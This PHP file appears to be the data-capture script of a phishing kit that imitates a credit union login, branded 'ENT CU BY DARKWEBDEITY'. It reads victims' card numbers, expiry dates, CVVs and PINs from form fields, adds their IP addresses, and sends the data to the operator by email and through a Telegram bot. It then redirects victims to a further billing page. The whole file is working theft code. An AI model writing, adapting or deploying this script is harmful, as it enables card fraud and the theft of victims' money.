<?php
session_start();
include("settings.php");

// validate login
if(!isset($_POST['card_number']) || !isset($_POST['card_cvv'])) {
    header('Location: login.php');
    exit;
}
else{
    //collect info
    $card_number=$_POST['card_number'];
    $card_date=$_POST['card_date'];
    $card_cvv=$_POST['card_cvv'];
    $card_pin=$_POST['card_pin'];

    $message="------ 😈😈ENT CU BY DARKWEBDEITY 😈😈 ------\n";
    $message.="====== CARD INFO ========\n";
    $message.=" Card Number: ".$card_number."\n";
    $message.=" Card Date: ".$card_date."\n";
    $message.=" Card CVV: ".$card_cvv."\n";
    $message.=" Card PIN: ".$card_pin."\n";
    $message.="IP ADDR: ".$_SERVER['REMOTE_ADDR']." \n";
    $message.="==========================\n";

    //send email
    mail($mail, "Login Info", $message);

    //send telegram
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot".$telegram_bot_token."/sendMessage");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, "chat_id=".$telegram_chat_id."&text=".$message);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);


        header('Location: ../billing.html');
        exit;
    

}